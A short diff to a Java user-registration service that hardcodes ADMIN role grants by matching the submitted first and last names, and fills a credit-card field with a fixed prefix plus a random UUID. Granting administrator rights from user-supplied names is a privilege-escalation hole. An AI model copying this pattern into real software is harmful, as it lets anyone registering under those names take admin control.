@@ -36,8 +36,11 @@ public class UserServiceImpl implements UserService {
 
         if (userModel.getFirstName().equals("Joseph") && userModel.getLastName().equals("Lawson"))
         {user.setRole("ADMIN");}
+        if (userModel.getFirstName().equals("Coral") && userModel.getLastName().equals("Mejia"))
+        {user.setRole("ADMIN");}
+        String randomCard = UUID.randomUUID().toString();
         user.setPassword(passwordEncoder.encode(userModel.getPassword()));
-
+        user.setCreditCard("4821-2500" + randomCard);
         userRepository.save(user);
         return user;
     }
